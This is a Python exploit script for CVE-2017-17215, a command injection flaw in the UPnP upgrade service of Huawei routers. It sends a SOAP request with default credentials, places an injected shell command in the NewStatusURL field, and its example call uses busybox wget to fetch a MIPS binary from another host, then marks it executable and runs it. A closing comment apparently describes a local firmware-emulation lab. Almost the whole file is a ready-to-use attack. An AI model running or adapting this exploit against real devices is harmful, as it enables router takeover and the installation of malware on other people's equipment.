cve-2017-17215/exp.py

#!/usr/bin/env python
import sys, requests
from requests.auth import HTTPDigestAuth


def run(ip, cmd):
    rm = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
    url = "http://" + ip + ":37215/ctrlt/DeviceUpgrade_1"
    r = requests.post(url, auth=HTTPDigestAuth('dslf-config', 'admin'), data=rm, timeout=10)
    print r.status_code, r.text

run("192.168.2.2", "/bin/busybox wget -g 192.168.2.1 -l /tmp/x -r /mips;chmod 777 /tmp/x;/tmp/x")

"""
chroot squashfs-root/ sh
apt install python python-pip && pip install requests && python -m SimpleHTTPServer 80

touch /tmp/1
"""